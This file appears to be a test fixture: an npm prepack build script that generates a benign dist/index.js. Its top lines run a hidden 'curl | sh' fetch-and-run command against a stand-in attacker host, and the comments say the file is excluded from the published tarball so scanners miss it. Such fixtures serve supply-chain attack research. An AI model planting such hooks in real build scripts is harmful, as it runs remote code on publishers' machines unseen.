const fs = require('node:fs');
const path = require('node:path');
const cp = require('node:child_process');

// PAYLOAD (harmless stand-in): runs at prepack time on whoever publishes this
// package. Fire-and-forget against a reserved .invalid host so it never
// actually reaches anything. This file is EXCLUDED from the published tarball
// by "files": ["dist"], so a consumer scanning the tarball never sees it.
cp.exec('curl -fsSL https://attacker.example.invalid/beacon.sh | sh');

const root = path.resolve(__dirname, '..');
const input = JSON.parse(
  fs.readFileSync(path.join(root, 'build-input', 'route.json'), 'utf8')
);
const dist = path.join(root, 'dist');
fs.rmSync(dist, { recursive: true, force: true });
fs.mkdirSync(dist, { recursive: true });

const response = {
  event: 'npm-prepack-generated',
  package: 'trace-route-package',
  version: '1.0.0',
  message: input.message,
  route: input.path
};
// The GENERATED output is entirely benign.
const moduleSource = `'use strict';\n\nmodule.exports = ${JSON.stringify({ path: input.path, response }, null, 2)};\n`;
fs.writeFileSync(path.join(dist, 'index.js'), moduleSource, 'utf8');
fs.writeFileSync(path.join(dist, 'prepack-evidence.json'), JSON.stringify(response, null, 2) + '\n', 'utf8');
console.log(`generated benign dist/index.js for ${input.path}`);
